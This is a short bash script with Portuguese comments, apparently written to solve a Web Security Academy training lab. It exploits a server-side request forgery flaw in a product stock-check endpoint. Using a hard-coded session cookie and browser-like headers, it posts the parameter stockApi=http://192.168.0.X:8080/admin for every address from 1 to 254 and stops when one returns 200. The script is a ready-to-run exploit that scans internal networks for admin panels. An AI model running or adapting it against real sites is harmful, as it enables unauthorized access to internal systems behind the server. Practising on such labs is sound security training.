#!/bin/bash

# Configurações fixas
HOST="0acc0074041e82be8142e37d00880042.web-security-academy.net"
URL="https://$HOST/product/stock"
COOKIE="session=7d6IwgHtWnLMganUmyIS9ZqrMrBz66xw"

# Cabeçalhos comuns
COMMON_HEADERS=(
  -H "Host: $HOST"
  -H "Cookie: $COOKIE"
  -H "Sec-Ch-Ua-Platform: \"Linux\""
  -H "Accept-Language: pt-BR,pt;q=0.9"
  -H "Sec-Ch-Ua: \"Chromium\";v=\"135\", \"Not-A.Brand\";v=\"8\""
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Sec-Ch-Ua-Mobile: ?0"
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
  -H "Accept: */*"
  -H "Origin: https://$HOST"
  -H "Sec-Fetch-Site: same-origin"
  -H "Sec-Fetch-Mode: cors"
  -H "Sec-Fetch-Dest: empty"
  -H "Referer: https://$HOST/product?productId=20"
  -H "Accept-Encoding: gzip, deflate, br"
  -H "Priority: u=1, i"
)

# Loop para testar diferentes valores de stockApi
for i in {1..254}; do
  IP="192.168.0.$i"
  DATA="stockApi=http://$IP:8080/admin"

  echo "[*] Testando IP: $IP"

  # Envia requisição usando HTTP/2 e captura o código de status
  STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" --http2 -X POST "${COMMON_HEADERS[@]}" --data "$DATA" "$URL")

  if [ "$STATUS_CODE" -eq 200 ]; then
    echo "[+] Sucesso com IP $IP - Status: $STATUS_CODE"
    echo "stockApi=http://$IP:8080/admin"
    break
  else
    echo "[-] Falha com IP $IP - Status: $STATUS_CODE"
  fi
done

